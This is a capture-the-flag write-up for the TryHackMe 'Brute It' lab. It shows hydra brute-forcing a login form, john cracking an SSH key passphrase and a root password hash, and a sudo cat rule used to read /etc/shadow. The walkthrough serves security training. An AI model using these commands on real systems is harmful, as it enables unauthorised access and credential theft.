---
title: THM{Brute It}
author: Anugrah SR
date: 2020-11-07 02:00:00 +0800
categories: [Boot2root,Tryhackme]
tags: [Brute, tryhackme, ssh, nmap, sudo,gobuster, john, linux]
math: true
---
# Brute It
## About The Room
*Learn how to brute, hash cracking and escalate privileges in this box!*<br>
* Url: https://tryhackme.com/room/bruteit
* Creator: [ReddyyZ](https://tryhackme.com/p/ReddyyZ)

## Reconnaissance
### Nmap scan
```bash
nmap -sC -sV -T4 10.10.244.141

Starting Nmap 7.91 ( https://nmap.org ) at 2020-11-06 14:38 EST
Nmap scan report for 10.10.244.141
Host is up (0.17s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 4b:0e:bf:14:fa:54:b3:5c:44:15:ed:b2:5d:a0:ac:8f (RSA)
|   256 d0:3a:81:55:13:5e:87:0c:e8:52:1e:cf:44:e0:3a:54 (ECDSA)
|_  256 da:ce:79:e0:45:eb:17:25:ef:62:ac:98:f0:cf:bb:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.01 seconds

```
We have identified two ports
* 22 ssh
* 80 http

### Gobuster
```bash
gobuster dir -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -u http://10.10.244.141  
===============================================================
Gobuster v3.1.0
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.244.141
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.1.0
[+] Timeout:                 10s
===============================================================
2020/11/06 14:35:49 Starting gobuster in directory enumeration mode
===============================================================
/admin                (Status: 301) [Size: 314] [--> http://10.10.244.141/admin/]
```
### HTTP
http://10.10.244.141/admin/ is a admin panel
![admin](https://imgur.com/PlNWCcZl.png)

`Looking for username?
Did you checked the source code!`

![source code](https://imgur.com/HJLJuc9l.png)
```html
 <!-- Hey john, if you do not remember, the username is admin -->
```
Bingo! username is `admin`

### Hydra
Brute-forcing admin panel form using hydra with username admin
```bash
hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.10.244.141 http-post-form "/admin/index.php:user=^USER^&pass=^PASS^:Username or password invalid" -f
```
Now you have the password for the admin panel! let's see what's inside?
![rsa key](https://imgur.com/vxTZKSul.png)
There is also a web flag like THM{xxxxxxxxxxxxxxxxxx}

### RSA private key
Save the rsa file to your local system
#### John
With John, we can crack not only simple password hashes but also SSH Keys
`/usr/share/john/ssh2john.py id_rsa > id_rsa.hashes`

Let's use john and rockyou.txt to try and crack the SSH Key.
```bash
john id_rsa.hash -wordlist=rockyou.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH [RSA/DSA/EC/OPENSSH (SSH private keys) 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 0 for all loaded hashes
Cost 2 (iteration count) is 1 for all loaded hashes
Will run 4 OpenMP threads
Note: This format may emit false positives, so it will keep trying even after
finding a possible candidate.
Press 'q' or Ctrl-C to abort, almost any other key for status
XXXXXXXXXX       (id_rsa)
Warning: Only 2 candidates left, minimum 4 needed for performance.
1g 0:00:00:07 DONE (2020-11-06 14:56) 0.1338g/s 1919Kp/s 1919Kc/s 1919KC/sa6_123..*7¡Vamos!
Session completed
```
## Gaining Shell
### SSH and User flag
before using ssh to connect don't forget to change permission of rsa key
`chmod 400 id_rsa`

Now we are ready to pwn the box
`ssh john@10.10.244.141 -i "id_rsa"`
User flag
```bash
john@bruteit:~$ cat user.txt
THM{XXXXXXXXXXXXXXXXXXXXXX}
```
## Privilege escalation
### Root flag
```bash
john@bruteit:~$ sudo -l
Matching Defaults entries for john on bruteit:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User john may run the following commands on bruteit:
    (root) NOPASSWD: /bin/cat
```
*If the binary is allowed to run as superuser by `sudo`, it does not drop the elevated privileges and may be used to access the file system, escalate or maintain privileged access.*
```bash
    LFILE=file_to_read
    sudo cat "$LFILE"
```
```bash
john@bruteit:~$ LFILE=/root/root.txt
john@bruteit:~$ sudo cat "$LFILE"
THM{XXXXXXXXXXXX}
```
We are asked to find root's password?<br>
Read shadow file and crack the password of Root

```bash
john@bruteit:~$ LFILE=/etc/shadow
john@bruteit:~$ sudo cat "$LFILE"
root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::
daemon:*:18295:0:99999:7:::
bin:*:18295:0:99999:7:::
sys:*:18295:0:99999:7:::
sync:*:18295:0:99999:7:::
games:*:18295:0:99999:7:::
man:*:18295:0:99999:7:::
lp:*:18295:0:99999:7:::
...
```
#### John to crack admin password
```bash
echo "root:$6$zdk0.jUm$Vya24cGzM1duJkwM5b17Q205xDJ47LOAg/OpZvJ1gKbLF8PJBdKJA4a6M.JYPUTAaWu4infDjI88U9yUXEVgL.:18490:0:99999:7:::" >root.txt
```
```bash
john root.txt                                                       
Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 256/256 AVX2 4x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 4 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl-C to abort, almost any other key for status
Warning: Only 14 candidates buffered for the current salt, minimum 16 needed for performance.
Warning: Only 10 candidates buffered for the current salt, minimum 16 needed for performance.
Warning: Only 15 candidates buffered for the current salt, minimum 16 needed for performance.
Almost done: Processing the remaining buffered candidate passwords, if any.
Warning: Only 8 candidates buffered for the current salt, minimum 16 needed for performance.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
xxxxxxx         (root)
1g 0:00:00:02 DONE 2/3 (2020-11-06 15:24) 0.4587g/s 1588p/s 1588c/s 1588C/s 123456..crawford
Use the "--show" option to display all of the cracked passwords reliably
Session completed
```
Thanks for reading this. Good Luck.
